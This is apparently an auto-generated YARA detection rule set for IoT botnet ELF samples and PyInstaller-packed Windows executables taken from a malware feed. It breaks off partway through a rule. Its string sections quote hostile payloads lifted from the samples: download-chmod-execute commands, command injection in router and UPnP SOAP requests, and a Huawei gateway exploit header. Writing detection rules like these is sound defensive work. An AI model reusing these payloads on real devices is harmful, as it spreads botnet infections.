/*
   YARA Rule Set
   Author: Sameer P Sheik
   Date: 2025-01-10
   Identifier: evidences
   Reference: https://datalake.abuse.ch/malware-bazaar/daily/
*/

/* Rule Set ----------------------------------------------------------------- */

import "pe"

rule sig_08122b836320e81dd3de7f789ea954d3ab9feabccee9200be3b37396a7fbffcc {
   meta:
      description = "evidences - file 08122b836320e81dd3de7f789ea954d3ab9feabccee9200be3b37396a7fbffcc.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-10"
      hash1 = "08122b836320e81dd3de7f789ea954d3ab9feabccee9200be3b37396a7fbffcc"
   strings:
      $s1 = "relogin.htm" fullword ascii
      $s2 = "User-Agent: curl/7.88.1" fullword ascii
      $s3 = "authkey" fullword ascii
      $s4 = "hostport=" fullword ascii
      $s5 = "{ \"Name\" : \"OPSystemUpgrade\", \"OPSystemUpgrade\" : { \"Action\" : \"Start\", \"Type\" : \"System\" }, \"SessionID\" : \"0x0" ascii
      $s6 = "Hash.Cookie" fullword ascii
      $s7 = "o?head-?ebs" fullword ascii
      $s8 = "t{|}f&~gq{&fdt{|}f9&d&oggodm&kget{|}f:&d&oggodm&kget{|}f;&d&oggodm&kget{|}f<&d&oggodm&kget{|}f&~gax{|}f|&kget{|}f&{axfm|&fm|" fullword ascii
      $s9 = "GoAhead" fullword ascii
      $s10 = "\"OPSystemUpgrade\", \"Ret\" : 100" fullword ascii
      $s11 = "cgi-bin/main-cgi" fullword ascii
      $s12 = "?ages/?ogin.htm" fullword ascii
      $s13 = "mini_httpd" fullword ascii
      $s14 = "doc/script" fullword ascii
      $s15 = "HTTPD_gw" fullword ascii
      $s16 = "{ \"Ret\" : 100, \"SessionID\" : \"0x0\" }" fullword ascii
      $s17 = "?ogin.rsp" fullword ascii
      $s18 = "pluginVersionTip" fullword ascii
      $s19 = "TOTOLINK" fullword ascii
      $s20 = "TKXGYKI" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule sig_8419ca7a15cfcf147d47986cc5a9ca3fc6bd5bcff1a9bbad455227bc214f1eef {
   meta:
      description = "evidences - file 8419ca7a15cfcf147d47986cc5a9ca3fc6bd5bcff1a9bbad455227bc214f1eef.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-10"
      hash1 = "8419ca7a15cfcf147d47986cc5a9ca3fc6bd5bcff1a9bbad455227bc214f1eef"
   strings:
      $s1 = "relogin.htm" fullword ascii
      $s2 = "User-Agent: curl/7.88.1" fullword ascii
      $s3 = "authkey" fullword ascii
      $s4 = "hostport=" fullword ascii
      $s5 = "{ \"Name\" : \"OPSystemUpgrade\", \"OPSystemUpgrade\" : { \"Action\" : \"Start\", \"Type\" : \"System\" }, \"SessionID\" : \"0x0" ascii
      $s6 = "Hash.Cookie" fullword ascii
      $s7 = "o?head-?ebs" fullword ascii
      $s8 = "t{|}f&~gq{&fdt{|}f9&d&oggodm&kget{|}f:&d&oggodm&kget{|}f;&d&oggodm&kget{|}f<&d&oggodm&kget{|}f&~gax{|}f|&kget{|}f&{axfm|&fm|" fullword ascii
      $s9 = "GoAhead" fullword ascii
      $s10 = "\"OPSystemUpgrade\", \"Ret\" : 100" fullword ascii
      $s11 = "cgi-bin/main-cgi" fullword ascii
      $s12 = "?ages/?ogin.htm" fullword ascii
      $s13 = "mini_httpd" fullword ascii
      $s14 = "doc/script" fullword ascii
      $s15 = "HTTPD_gw" fullword ascii
      $s16 = "{ \"Ret\" : 100, \"SessionID\" : \"0x0\" }" fullword ascii
      $s17 = "?ogin.rsp" fullword ascii
      $s18 = "pluginVersionTip" fullword ascii
      $s19 = "TOTOLINK" fullword ascii
      $s20 = "TKXGYKI" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule sig_417c60b23fbd8dde6ce9524f83532b6375c93fdbb6b0da727a0ea0fdf514eaee {
   meta:
      description = "evidences - file 417c60b23fbd8dde6ce9524f83532b6375c93fdbb6b0da727a0ea0fdf514eaee.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-10"
      hash1 = "417c60b23fbd8dde6ce9524f83532b6375c93fdbb6b0da727a0ea0fdf514eaee"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $s2 = "wget http://%d.%d.%d.%d/%s -O /tmp/%s; chmod 777 /tmp/%s; /tmp/%s %s.p4 > /dev/null 2>&1" fullword ascii
      $s3 = "cd /tmp; wget http://%d.%d.%d.%d/%s -q; chmod 777 %s; ./%s %s.p1 > /dev/null 2>&1" fullword ascii
      $s4 = "cd /tmp; wget http://%d.%d.%d.%d/%s; chmod 777 %s; ./%s %s.p2 > /dev/null 2>&1" fullword ascii
      $s5 = "cd /tmp; wget http://%d.%d.%d.%d/%s; chmod 777 %s; ./%s %s.p3 > /dev/null 2>&1 &" fullword ascii
      $s6 = "time1=00:00-00:00&time2=00:00-00:00&mac=;rm -rf /tmp/*; cd /tmp; wget http://%d.%d.%d.%d/2; chmod 777 2; ./2 lblink.selfrep;" fullword ascii
      $s7 = "in/busybox wget -g %d.%d.%d.%d -l /tmp/.vs -r /h; /bin/busybox chmod 777 /tmp/.vs; /tmp/.vs; sh /tmp/.vs)</NewStatusURL><NewDown" ascii
      $s8 = "crontab /tmp/crontab.tmp" fullword ascii
      $s9 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows" fullword ascii
      $s10 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1" fullword ascii
      $s11 = "POST /goform/set_LimitClient_cfg HTTP/1.1" fullword ascii
      $s12 = "g/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(rm -rf /tmp/*;" ascii
      $s13 = "HOST: 255.255.255.255:1900" fullword ascii
      $s14 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/" ascii
      $s15 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/" ascii
      $s16 = "service:service-agent" fullword ascii
      $s17 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $s18 = "loadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii
      $s19 = "eviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a25" ascii
      $s20 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule sig_60cf037d682bb28c7594d93f1d2bc8f1bac75b7b32a5a4caef81b68dc346d7b2 {
   meta:
      description = "evidences - file 60cf037d682bb28c7594d93f1d2bc8f1bac75b7b32a5a4caef81b68dc346d7b2.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-10"
      hash1 = "60cf037d682bb28c7594d93f1d2bc8f1bac75b7b32a5a4caef81b68dc346d7b2"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $s2 = "wget http://%d.%d.%d.%d/%s -O /tmp/%s; chmod 777 /tmp/%s; /tmp/%s %s.p4 > /dev/null 2>&1" fullword ascii
      $s3 = "cd /tmp; wget http://%d.%d.%d.%d/%s -q; chmod 777 %s; ./%s %s.p1 > /dev/null 2>&1" fullword ascii
      $s4 = "cd /tmp; wget http://%d.%d.%d.%d/%s; chmod 777 %s; ./%s %s.p2 > /dev/null 2>&1" fullword ascii
      $s5 = "cd /tmp; wget http://%d.%d.%d.%d/%s; chmod 777 %s; ./%s %s.p3 > /dev/null 2>&1 &" fullword ascii
      $s6 = "time1=00:00-00:00&time2=00:00-00:00&mac=;rm -rf /tmp/*; cd /tmp; wget http://%d.%d.%d.%d/2; chmod 777 2; ./2 lblink.selfrep;" fullword ascii
      $s7 = "in/busybox wget -g %d.%d.%d.%d -l /tmp/.vs -r /h; /bin/busybox chmod 777 /tmp/.vs; /tmp/.vs; sh /tmp/.vs)</NewStatusURL><NewDown" ascii
      $s8 = "crontab /tmp/crontab.tmp" fullword ascii
      $s9 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows" fullword ascii
      $s10 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1" fullword ascii
      $s11 = "POST /goform/set_LimitClient_cfg HTTP/1.1" fullword ascii
      $s12 = "g/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(rm -rf /tmp/*;" ascii
      $s13 = "HOST: 255.255.255.255:1900" fullword ascii
      $s14 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/" ascii
      $s15 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/" ascii
      $s16 = "service:service-agent" fullword ascii
      $s17 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $s18 = "loadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii
      $s19 = "eviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a25" ascii
      $s20 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule sig_931b1fdbbaf49829ac46ee129e0c628624b7a315f0abd4bd229b4837b1e1ee02 {
   meta:
      description = "evidences - file 931b1fdbbaf49829ac46ee129e0c628624b7a315f0abd4bd229b4837b1e1ee02.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-10"
      hash1 = "931b1fdbbaf49829ac46ee129e0c628624b7a315f0abd4bd229b4837b1e1ee02"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $s2 = "wget http://%d.%d.%d.%d/%s -O /tmp/%s; chmod 777 /tmp/%s; /tmp/%s %s.p4" fullword ascii
      $s3 = "cd /tmp; wget http://%d.%d.%d.%d/%s; chmod 777 %s; ./%s %s.p3 &" fullword ascii
      $s4 = "cd /tmp; wget http://%d.%d.%d.%d/%s; chmod 777 %s; ./%s %s.p1" fullword ascii
      $s5 = "cd /tmp; wget http://%d.%d.%d.%d/%s; chmod 777 %s; ./%s %s.p2" fullword ascii
      $s6 = "time1=00:00-00:00&time2=00:00-00:00&mac=;rm -rf /tmp/*; cd /tmp; wget http://%d.%d.%d.%d/2; chmod 777 2; ./2 lblink.selfrep;" fullword ascii
      $s7 = "in/busybox wget -g %d.%d.%d.%d -l /tmp/.vs -r /h; /bin/busybox chmod 777 /tmp/.vs; /tmp/.vs; sh /tmp/.vs)</NewStatusURL><NewDown" ascii
      $s8 = "crontab /tmp/crontab.tmp" fullword ascii
      $s9 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows" fullword ascii
      $s10 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1" fullword ascii
      $s11 = "POST /goform/set_LimitClient_cfg HTTP/1.1" fullword ascii
      $s12 = "g/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(rm -rf /tmp/*;" ascii
      $s13 = "HOST: 255.255.255.255:1900" fullword ascii
      $s14 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/" ascii
      $s15 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/" ascii
      $s16 = "service:service-agent" fullword ascii
      $s17 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $s18 = "loadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii
      $s19 = "eviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a25" ascii
      $s20 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule sig_966fe54323163222cacbbfa6e1a7884f0cde8e68f1ac065d7c45995457265da9 {
   meta:
      description = "evidences - file 966fe54323163222cacbbfa6e1a7884f0cde8e68f1ac065d7c45995457265da9.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-10"
      hash1 = "966fe54323163222cacbbfa6e1a7884f0cde8e68f1ac065d7c45995457265da9"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $s2 = "wget http://%d.%d.%d.%d/%s -O /tmp/%s; chmod 777 /tmp/%s; /tmp/%s %s.p4" fullword ascii
      $s3 = "cd /tmp; wget http://%d.%d.%d.%d/%s; chmod 777 %s; ./%s %s.p3 &" fullword ascii
      $s4 = "cd /tmp; wget http://%d.%d.%d.%d/%s; chmod 777 %s; ./%s %s.p1" fullword ascii
      $s5 = "cd /tmp; wget http://%d.%d.%d.%d/%s; chmod 777 %s; ./%s %s.p2" fullword ascii
      $s6 = "time1=00:00-00:00&time2=00:00-00:00&mac=;rm -rf /tmp/*; cd /tmp; wget http://%d.%d.%d.%d/2; chmod 777 2; ./2 lblink.selfrep;" fullword ascii
      $s7 = "in/busybox wget -g %d.%d.%d.%d -l /tmp/.vs -r /h; /bin/busybox chmod 777 /tmp/.vs; /tmp/.vs; sh /tmp/.vs)</NewStatusURL><NewDown" ascii
      $s8 = "crontab /tmp/crontab.tmp" fullword ascii
      $s9 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows" fullword ascii
      $s10 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1" fullword ascii
      $s11 = "POST /goform/set_LimitClient_cfg HTTP/1.1" fullword ascii
      $s12 = "g/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(rm -rf /tmp/*;" ascii
      $s13 = "HOST: 255.255.255.255:1900" fullword ascii
      $s14 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/" ascii
      $s15 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/" ascii
      $s16 = "service:service-agent" fullword ascii
      $s17 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $s18 = "loadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii
      $s19 = "eviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a25" ascii
      $s20 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule a0c7c82f75cba0b84dcf1a2a3e785116f06c86cbfa40d60664f890d06383096a {
   meta:
      description = "evidences - file a0c7c82f75cba0b84dcf1a2a3e785116f06c86cbfa40d60664f890d06383096a.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-10"
      hash1 = "a0c7c82f75cba0b84dcf1a2a3e785116f06c86cbfa40d60664f890d06383096a"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $s2 = "time1=00:00-00:00&time2=00:00-00:00&mac=;rm -rf /tmp/*; cd /tmp; wget http://%d.%d.%d.%d/2; chmod 777 2; ./2 lblink.selfrep;" fullword ascii
      $s3 = "wget http://%d.%d.%d.%d/3 -O /tmp/3; chmod 777 /tmp/3; /tmp/3 %s.p4 > /dev/null 2>&1" fullword ascii
      $s4 = "cd /tmp; wget http://%d.%d.%d.%d/3; chmod 777 3; ./3 %s.p2 > /dev/null 2>&1" fullword ascii
      $s5 = "cd /tmp; wget http://%d.%d.%d.%d/3; chmod 777 3; ./3 %s.p1 > /dev/null 2>&1" fullword ascii
      $s6 = "cd /tmp; wget http://%d.%d.%d.%d/3; chmod 777 3; ./3 %s.p3 > /dev/null 2>&1 &" fullword ascii
      $s7 = "in/busybox wget -g %d.%d.%d.%d -l /tmp/.vs -r /h; /bin/busybox chmod 777 /tmp/.vs; /tmp/.vs; sh /tmp/.vs)</NewStatusURL><NewDown" ascii
      $s8 = "crontab /tmp/crontab.tmp" fullword ascii
      $s9 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows" fullword ascii
      $s10 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1" fullword ascii
      $s11 = "POST /goform/set_LimitClient_cfg HTTP/1.1" fullword ascii
      $s12 = "g/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(rm -rf /tmp/*;" ascii
      $s13 = "HOST: 255.255.255.255:1900" fullword ascii
      $s14 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/" ascii
      $s15 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/" ascii
      $s16 = "service:service-agent" fullword ascii
      $s17 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $s18 = "loadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii
      $s19 = "eviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a25" ascii
      $s20 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule c54718cedd4e24bda9fb2b7676e11db2f232c57005c8c72d875c3a3eff050c2a {
   meta:
      description = "evidences - file c54718cedd4e24bda9fb2b7676e11db2f232c57005c8c72d875c3a3eff050c2a.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-10"
      hash1 = "c54718cedd4e24bda9fb2b7676e11db2f232c57005c8c72d875c3a3eff050c2a"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $s2 = "wget http://%d.%d.%d.%d/%s -O /tmp/%s; chmod 777 /tmp/%s; /tmp/%s %s.p4 > /dev/null 2>&1" fullword ascii
      $s3 = "cd /tmp; wget http://%d.%d.%d.%d/%s -q; chmod 777 %s; ./%s %s.p1 > /dev/null 2>&1" fullword ascii
      $s4 = "cd /tmp; wget http://%d.%d.%d.%d/%s; chmod 777 %s; ./%s %s.p2 > /dev/null 2>&1" fullword ascii
      $s5 = "cd /tmp; wget http://%d.%d.%d.%d/%s; chmod 777 %s; ./%s %s.p3 > /dev/null 2>&1 &" fullword ascii
      $s6 = "time1=00:00-00:00&time2=00:00-00:00&mac=;rm -rf /tmp/*; cd /tmp; wget http://%d.%d.%d.%d/2; chmod 777 2; ./2 lblink.selfrep;" fullword ascii
      $s7 = "in/busybox wget -g %d.%d.%d.%d -l /tmp/.vs -r /h; /bin/busybox chmod 777 /tmp/.vs; /tmp/.vs; sh /tmp/.vs)</NewStatusURL><NewDown" ascii
      $s8 = "crontab /tmp/crontab.tmp" fullword ascii
      $s9 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows" fullword ascii
      $s10 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1" fullword ascii
      $s11 = "POST /goform/set_LimitClient_cfg HTTP/1.1" fullword ascii
      $s12 = "g/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(rm -rf /tmp/*;" ascii
      $s13 = "HOST: 255.255.255.255:1900" fullword ascii
      $s14 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/" ascii
      $s15 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/" ascii
      $s16 = "service:service-agent" fullword ascii
      $s17 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $s18 = "loadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii
      $s19 = "eviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a25" ascii
      $s20 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule eb7110191ac7e0c0e739339d0ec5e97cc8cc19d85f3ea1ffeae87d0413e0ca3b {
   meta:
      description = "evidences - file eb7110191ac7e0c0e739339d0ec5e97cc8cc19d85f3ea1ffeae87d0413e0ca3b.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-10"
      hash1 = "eb7110191ac7e0c0e739339d0ec5e97cc8cc19d85f3ea1ffeae87d0413e0ca3b"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $s2 = "wget http://%d.%d.%d.%d/%s -O /tmp/%s; chmod 777 /tmp/%s; /tmp/%s %s.p4 > /dev/null 2>&1" fullword ascii
      $s3 = "cd /tmp; wget http://%d.%d.%d.%d/%s -q; chmod 777 %s; ./%s %s.p1 > /dev/null 2>&1" fullword ascii
      $s4 = "cd /tmp; wget http://%d.%d.%d.%d/%s; chmod 777 %s; ./%s %s.p2 > /dev/null 2>&1" fullword ascii
      $s5 = "cd /tmp; wget http://%d.%d.%d.%d/%s; chmod 777 %s; ./%s %s.p3 > /dev/null 2>&1 &" fullword ascii
      $s6 = "time1=00:00-00:00&time2=00:00-00:00&mac=;rm -rf /tmp/*; cd /tmp; wget http://%d.%d.%d.%d/2; chmod 777 2; ./2 lblink.selfrep;" fullword ascii
      $s7 = "in/busybox wget -g %d.%d.%d.%d -l /tmp/.vs -r /h; /bin/busybox chmod 777 /tmp/.vs; /tmp/.vs; sh /tmp/.vs)</NewStatusURL><NewDown" ascii
      $s8 = "crontab /tmp/crontab.tmp" fullword ascii
      $s9 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows" fullword ascii
      $s10 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1" fullword ascii
      $s11 = "POST /goform/set_LimitClient_cfg HTTP/1.1" fullword ascii
      $s12 = "g/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(rm -rf /tmp/*;" ascii
      $s13 = "HOST: 255.255.255.255:1900" fullword ascii
      $s14 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/" ascii
      $s15 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/" ascii
      $s16 = "service:service-agent" fullword ascii
      $s17 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $s18 = "loadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii
      $s19 = "eviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a25" ascii
      $s20 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule sig_95f89677ac06e21b3fb760233e4a8caf5a49cad663bb9a4944a904dfa3debdab {
   meta:
      description = "evidences - file 95f89677ac06e21b3fb760233e4a8caf5a49cad663bb9a4944a904dfa3debdab.exe"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-10"
      hash1 = "95f89677ac06e21b3fb760233e4a8caf5a49cad663bb9a4944a904dfa3debdab"
   strings:
      $s1 = "      <assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"*" ascii
      $s2 = "bVCRUNTIME140.dll" fullword ascii
      $s3 = "VCRUNTIME140.dll" fullword wide
      $s4 = "      <assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"*" ascii
      $s5 = "Failed to execute script '%s' due to unhandled exception!" fullword ascii
      $s6 = "9python313.dll" fullword ascii
      $s7 = "bpython313.dll" fullword ascii
      $s8 = "Failed to extract %s: failed to open target file!" fullword ascii
      $s9 = "LOADER: failed to convert runtime-tmpdir to a wide string." fullword wide
      $s10 = "LOADER: failed to expand environment variables in the runtime-tmpdir." fullword wide
      $s11 = "LOADER: runtime-tmpdir points to non-existent drive %ls (type: %d)!" fullword wide
      $s12 = "LOADER: failed to obtain the absolute path of the runtime-tmpdir." fullword wide
      $s13 = "LOADER: failed to create runtime-tmpdir path %ls!" fullword wide
      $s14 = "blibcrypto-3.dll" fullword ascii
      $s15 = "AppPolicyGetProcessTerminationMethod" fullword ascii
      $s16 = "blibssl-3.dll" fullword ascii
      $s17 = "Failed to initialize security descriptor for temporary directory!" fullword ascii
      $s18 = "%s%c%s.exe" fullword ascii
      $s19 = "Path of ucrtbase.dll (%s) and its name exceed buffer size (%d)" fullword ascii
      $s20 = "LOADER: failed to set the TMP environment variable." fullword wide
   condition:
      uint16(0) == 0x5a4d and filesize < 22000KB and
      8 of them
}

rule b58b7853318f6c9f0d66d1f2a8d7ff5ad42be424fdf8e04615d8c38980b3811b {
   meta:
      description = "evidences - file b58b7853318f6c9f0d66d1f2a8d7ff5ad42be424fdf8e04615d8c38980b3811b.exe"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-10"
      hash1 = "b58b7853318f6c9f0d66d1f2a8d7ff5ad42be424fdf8e04615d8c38980b3811b"
   strings:
      $s1 = "      <assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"*" ascii
      $s2 = "bVCRUNTIME140.dll" fullword ascii
      $s3 = "VCRUNTIME140.dll" fullword wide
      $s4 = "      <assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"*" ascii
      $s5 = "Failed to execute script '%s' due to unhandled exception!" fullword ascii
      $s6 = "9python313.dll" fullword ascii
      $s7 = "bpython313.dll" fullword ascii
      $s8 = "Failed to extract %s: failed to open target file!" fullword ascii
      $s9 = "LOADER: failed to convert runtime-tmpdir to a wide string." fullword wide
      $s10 = "LOADER: failed to expand environment variables in the runtime-tmpdir." fullword wide
      $s11 = "LOADER: runtime-tmpdir points to non-existent drive %ls (type: %d)!" fullword wide
      $s12 = "LOADER: failed to obtain the absolute path of the runtime-tmpdir." fullword wide
      $s13 = "LOADER: failed to create runtime-tmpdir path %ls!" fullword wide
      $s14 = "blibcrypto-3.dll" fullword ascii
      $s15 = "AppPolicyGetProcessTerminationMethod" fullword ascii
